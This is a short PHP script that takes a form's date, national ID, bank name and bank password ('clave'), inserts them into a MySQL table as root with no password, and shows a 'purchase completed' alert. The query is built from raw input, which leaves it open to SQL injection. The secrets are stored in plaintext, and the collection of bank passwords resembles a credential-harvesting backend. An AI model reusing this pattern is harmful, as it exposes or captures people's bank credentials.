<?php

include("con_db.php");
$conex = mysqli_connect("localhost","root","","servicios");
if (isset($_POST['register'])){
    if(strlen($_POST['fecha']) >= 1 && 
     strlen($_POST['cedula']) >= 1 &&  
     strlen($_POST['banco']) >= 1 &&  
     strlen($_POST['clave']) >= 1){
     $fecha = trim ($_POST['fecha']);
     $cedula = trim ($_POST['cedula']);
    $banco = trim ($_POST['banco']);
    $clave = trim ($_POST['clave']);
    $fechareg = date("d/m/y");
 $consulta ="INSERT INTO productos( fecha,cedula,banco,clave) VALUES ('$fecha','$cedula','$banco','$clave')";
    $resultado = mysqli_query($conex,$consulta);
    if ($resultado ){
        ?> 
        <?php
         echo '<script type="text/javascript">'; echo 'alert("COMPRA REALIZADA CORRECTAMENTE")'; echo '</script>'
        ?>
       <?php
    } else {
     
        echo '<script type="text/javascript">'; echo 'alert("!UPS A OCURRIDO UN ERROR")'; echo '</script>'
        ?> 
       <?php
    }
}    else {
      
         echo '<script type="text/javascript">'; echo 'alert("NO SE PUDO REALIZAR LA  COMPRA")'; echo '</script>'
         ?> 
       <?php
    }

}   

?>
